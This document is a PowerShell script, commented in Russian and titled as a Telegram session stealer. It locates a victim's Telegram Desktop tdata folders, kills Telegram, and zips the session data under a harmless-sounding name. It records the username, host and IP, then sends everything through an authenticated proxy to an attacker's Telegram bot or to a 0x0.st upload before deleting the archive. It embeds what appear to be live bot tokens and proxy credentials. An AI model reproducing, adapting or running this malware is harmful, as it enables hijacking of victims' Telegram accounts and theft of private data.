# ============================================================
# Telegram Session Stealer + 0x0.st + Proxy (407 fix)
# ============================================================

$botToken = "8865169520:AAGWKCEINgQtP2Jtd3783tkOx-V2Uhq8D3A"
$chatId   = "8620709143"

# Настройки прокси (логин и пароль отдельно)
$proxyHost = "gate.proxydata.ru"
$proxyPort = 3129
$proxyUser = "user-xpx93ax5"
$proxyPass = "5pxp942ldb7jtnh2"

# Создаём прокси с авторизацией
$proxy = New-Object System.Net.WebProxy("http://$proxyHost`:$proxyPort", $true)
$proxy.Credentials = New-Object System.Net.NetworkCredential($proxyUser, $proxyPass)

# Функция для выполнения запросов через прокси
function Invoke-WebRequestViaProxy {
    param($Uri, $Method = "GET", $Body = $null, $Headers = $null, $UseBasicParsing = $true)
    $webRequest = [System.Net.WebRequest]::Create($Uri)
    $webRequest.Proxy = $proxy
    $webRequest.Method = $Method
    if ($Headers) {
        foreach ($key in $Headers.Keys) {
            $webRequest.Headers.Add($key, $Headers[$key])
        }
    }
    if ($Body) {
        $webRequest.ContentType = "application/json"
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        $webRequest.ContentLength = $bytes.Length
        $stream = $webRequest.GetRequestStream()
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Close()
    }
    $response = $webRequest.GetResponse()
    $reader = New-Object System.IO.StreamReader($response.GetResponseStream())
    $result = $reader.ReadToEnd()
    $reader.Close()
    $response.Close()
    return $result
}

$result = ""
try {
    # 1. Поиск tdata
    $paths = @()
    @("$env:APPDATA\Telegram Desktop\tdata", "$env:APPDATA\Telegram Desktop Beta\tdata") | ForEach-Object {
        if (Test-Path $_) { $paths += $_ }
    }
    if ($paths.Count -eq 0) {
        $result = "❌ tdata not found"
        Invoke-WebRequestViaProxy -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body "{`"chat_id`":`"$chatId`",`"text`":`"$result`"}"
        exit
    }

    # 2. Завершаем Telegram
    Get-Process -Name Telegram -ErrorAction SilentlyContinue | Stop-Process -Force

    # 3. Архивация
    $zip = "$env:TEMP\diag.zip"
    Compress-Archive -Path $paths -DestinationPath $zip -Force

    # 4. Сбор информации
    $size = (Get-Item $zip).Length
    $user = $env:USERNAME
    $comp = $env:COMPUTERNAME
    $ip   = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -Proxy $proxy).Content.Trim()
    $caption = "$user@$comp | IP: $ip"

    # 5. Отправка
    if ($size -gt 52428800) {
        # Большой файл → заливаем на 0x0.st (через прокси)
        $wc = New-Object System.Net.WebClient
        $wc.Proxy = $proxy
        $response = $wc.UploadFile("https://0x0.st", "POST", $zip)
        $link = [System.Text.Encoding]::UTF8.GetString($response).Trim()
        $msg = "$caption`nDownload: $link"
        $body = "{`"chat_id`":`"$chatId`",`"text`":`"$msg`"}"
        Invoke-WebRequestViaProxy -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body
        $result = "✅ Large file uploaded, link sent"
    } else {
        # Маленький файл → отправляем напрямую (через прокси)
        $bytes = [System.IO.File]::ReadAllBytes($zip)
        $boundary = "---------------------------$([DateTime]::Now.Ticks.ToString('x'))"
        $multipart = @()
        $multipart += "--$boundary"
        $multipart += 'Content-Disposition: form-data; name="chat_id"'
        $multipart += ""
        $multipart += $chatId
        $multipart += "--$boundary"
        $multipart += 'Content-Disposition: form-data; name="document"; filename="diag.zip"'
        $multipart += 'Content-Type: application/zip'
        $multipart += ""
        $multipart += [System.Text.Encoding]::ASCII.GetString($bytes)
        $multipart += "--$boundary--"
        $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
        # Используем WebClient для отправки multipart
        $wc = New-Object System.Net.WebClient
        $wc.Proxy = $proxy
        foreach ($key in $headers.Keys) {
            $wc.Headers.Add($key, $headers[$key])
        }
        $url = "https://api.telegram.org/bot$botToken/sendDocument?chat_id=$chatId&caption=$caption"
        $responseBytes = $wc.UploadData($url, "POST", [System.Text.Encoding]::UTF8.GetBytes(($multipart -join "`r`n")))
        $result = "✅ Small file sent directly"
    }
} catch {
    $result = "❌ Error: " + $_.Exception.Message
}

# 6. Удаляем временный архив
Remove-Item $zip -Force -ErrorAction SilentlyContinue

# 7. Отправляем уведомление о результате
if ($result -ne "") {
    try {
        $body = "{`"chat_id`":`"$chatId`",`"text`":`"$result`"}"
        Invoke-WebRequestViaProxy -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body
    } catch {}
}
